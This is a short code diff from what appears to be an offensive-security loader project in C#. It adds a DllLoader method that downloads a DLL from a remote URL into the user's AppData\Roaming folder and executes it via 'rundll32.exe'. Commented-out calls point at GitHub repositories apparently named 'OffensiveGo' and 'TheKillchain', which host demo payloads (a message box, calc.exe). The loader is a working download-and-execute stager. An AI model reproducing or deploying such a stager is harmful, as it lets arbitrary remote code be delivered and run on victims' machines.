@@ -23,13 +23,19 @@ namespace loader {
             process.Start();
         }
 
-        public static void Main(string[] args) {
-            //string file = "test.json";
-            //string fileLocation = "https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/calculator.json";
-            //GetFile(fileLocation, file);
+        public static void DllLoader(string remoteDllUrl, string localDllName, string dllEntryName) {
+            string currentUser = Environment.UserName;
+            GetFile(remoteDllUrl, localDllName);
+            string localDllPath = @$"C:\Users\{currentUser}\AppData\Roaming\{localDllName}"; 
+            string command = $"/c rundll32.exe {localDllPath},{dllEntryName}";
+            RunCommand(command);
+        }
 
-            //string command = "/c calc.exe";
-            //RunCommand(command);
+        public static void Main(string[] args) {
+            //string remoteDllUrl = "https://github.com/bakarilevy/OffensiveGo/blob/main/message_box/example.dll?raw=true";
+            //string localDllName = "messagebox.dll";
+            //string dllEntryName = "Test";
+            //DllLoader(remoteDllUrl, localDllName, dllEntryName);
         }
 
 
